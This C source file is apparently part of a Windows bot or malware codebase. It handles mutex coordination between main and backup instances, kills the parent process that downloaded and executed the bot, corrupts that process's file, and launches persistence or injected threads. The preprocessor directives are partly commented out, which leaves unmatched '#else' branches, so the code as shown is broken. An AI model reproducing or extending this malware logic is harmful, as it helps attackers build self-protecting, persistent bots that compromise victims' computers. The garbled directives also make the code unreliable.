#include "../Includes/includes.h"

void MutexHandler()
{
    if(CheckProgramMutexExistance(cUpdateMutex))
    {
        for(unsigned short us = 0; us < 100; us++)
        {
            if(!CheckProgramMutexExistance(cMainProcessMutex) && !CheckProgramMutexExistance(cBackupProcessMutex))
                break;
            else if(us == 99)
                TerminateProcess((HANDLE)-1, 0);

            Sleep(500);
        }
    }

    bool bMainMutexExists = CheckProgramMutexExistance(cMainProcessMutex);
    bool bBackupMutexExists = CheckProgramMutexExistance(cBackupProcessMutex);

    if(!bMainMutexExists && !bBackupMutexExists) //This is the first execution and Main instance
    {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef BOTKILL_PARENT_PROCESS //This will kill any programs downloading and executing the bot file
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef INCLUDE_BOTKILL
        DWORD dwParentProcessPid = GetParentProcessPid();
        if(dwParentProcessPid != 0 && dwParentProcessPid != GetPidFromFilename((TCHAR*)"explorer.exe"))
        {
            char cFilePath[MAX_PATH];
            memset(cFilePath, 0, sizeof(cFilePath));
            GetPathFromPid(dwParentProcessPid, cFilePath);

            if(KillProcessByPid(dwParentProcessPid, FALSE))
                dwKilledProcesses++;

            if(BreakFile(cFilePath))
                dwFileChanges++;
        }
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if

        SetProgramMutex(cMainProcessMutex);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef INCLUDE_STARTUP_INSTALLATION_AND_PERSISTANCE
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef INCLUDE_INJECTION
        StartSisterProcessFromMainInstance();
#else
        StartInjectedThreads();
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
        return;
    }
    else if(bMainMutexExists && !bBackupMutexExists) //This is the second execution and Backup instance
    {
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef INCLUDE_STARTUP_INSTALLATION_AND_PERSISTANCE
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef INCLUDE_INJECTION
        SetProgramMutex(cBackupProcessMutex);
        SisterProcessFromBackupInstanceMainBlockingLoop(); //Infinite loop until Termination
#else
        TerminateProcess((HANDLE)-1, 0);
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
    }
    else if(!bMainMutexExists && bBackupMutexExists) //This is a recovered Main instance
    {
        SetProgramMutex(cMainProcessMutex);

        bRecoveredProcess = TRUE;
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifdef INCLUDE_STARTUP_INSTALLATION_AND_PERSISTANCE
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#ifndef INCLUDE_INJECTION
        StartMonitorBackupProcessFromRecoveredInstance();
#else
        StartInjectedThreads();
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP//REMOVED_TEMP#if
        return;
    }
    else if(bMainMutexExists && bBackupMutexExists) //This is a re execution, and occurs if both the Main instance and Backup instance already exist
        TerminateProcess((HANDLE)-1, 0);
}
